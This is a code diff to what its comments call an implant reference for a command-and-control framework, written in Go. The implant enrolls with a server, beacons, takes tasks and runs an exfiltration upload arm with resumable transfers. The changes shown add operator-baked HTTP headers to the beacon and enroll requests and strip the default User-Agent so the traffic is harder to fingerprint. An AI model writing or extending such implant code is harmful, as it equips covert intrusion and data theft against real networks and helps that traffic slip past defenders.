@@ -2,8 +2,8 @@
 // community-slot reference): the Tier 0 wire contract -- enroll, beacon,
 // task -- plus the ADR-010 exfil upload arm with byte-offset resume, over
 // the web family's envelope POST cycle. It couples to the platform only
-// through the wire protocol and the baked profile (rod.proto, the
-// base64url JSON the build unit emits); nothing in-house is imported.
+// through the wire protocol and the baked profile file (rod.proto, the
+// rod.profile.json the build unit stages); nothing in-house is imported.
 package main
 
 import (
@@ -97,6 +97,7 @@ func run(p profile.Profile) error {
 	)
 	carriage := &transport.Envelope{URL: transport.BeaconURL(walk[0]), Client: client}
 	carriage.UserAgent = p.UserAgent
+	carriage.Headers = p.Headers
 
 	// The contact cycle: contact, drain, sleep the baked interval with
 	// jitter, repeat. Consecutive failures widen the pause and walk the
@@ -204,7 +205,16 @@ func enroll(url string, p profile.Profile, client *http.Client, spki []byte) (*e
 	if err != nil {
 		return nil, err
 	}
+	// The baked presentation: the Content-Type the envelope shape owns,
+	// then the User-Agent and headers the bake carries -- an empty baked
+	// User-Agent strips the header entirely (the default Go user string is
+	// a fingerprint no baked profile asked for), and a headers entry wins
+	// any same-named set above it.
 	request.Header.Set("Content-Type", "application/json")
+	request.Header.Set("User-Agent", p.UserAgent)
+	for name, value := range p.Headers {
+		request.Header.Set(name, value)
+	}
 	response, err := client.Do(request)
 	if err != nil {
 		return nil, fmt.Errorf("enroll transport: %w", err)
